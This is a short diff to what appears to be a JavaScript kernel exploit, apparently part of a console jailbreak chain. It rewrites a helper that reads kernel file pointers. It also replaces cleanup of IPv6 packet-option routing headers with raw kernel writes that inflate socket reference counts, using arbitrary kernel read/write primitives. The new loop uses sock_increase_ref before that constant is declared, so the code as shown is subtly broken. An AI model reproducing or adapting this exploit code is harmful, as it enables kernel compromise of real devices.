@@ -1490,9 +1490,8 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
  
  
 function get_fd_data_addr(fd) {
-    const o_files = kmem.addr(ofiles);                // Addr dell'array ofiles
-    const filep = o_files.readp(fd * SIZEOF_OFILES);  // legge il puntatore a file
-    return filep.readp(0);                            // legge f_data
+    const filep = kmem.readp(ofiles.add(fd * SIZEOF_OFILES));
+    return filep.readp(0);
 }
 
 function get_sock_pktopts(fd) {
@@ -1502,13 +1501,10 @@ function get_sock_pktopts(fd) {
 }
 
  try{
-for (let i = 0; i < sds.length; i++) {
-    const pkto = get_sock_pktopts(sds[i]);
-    kmem.write64(pkto.add(off_ip6po_rthdr), 0);
+for (const sd of sock_increase_ref) {
+    const sock_addr = get_fd_data_addr(sd);
+    kmem.write32(sock_addr, 0x100);
 }
-kmem.write64(get_sock_pktopts(reclaim_sock).add(off_ip6po_rthdr), 0);
-kmem.write64(worker_pktopts.add(off_ip6po_rthdr), 0);
- 
 const sock_increase_ref = [
   ipv6_kernel_rw.data.master_sock,
   ipv6_kernel_rw.data.victim_sock,
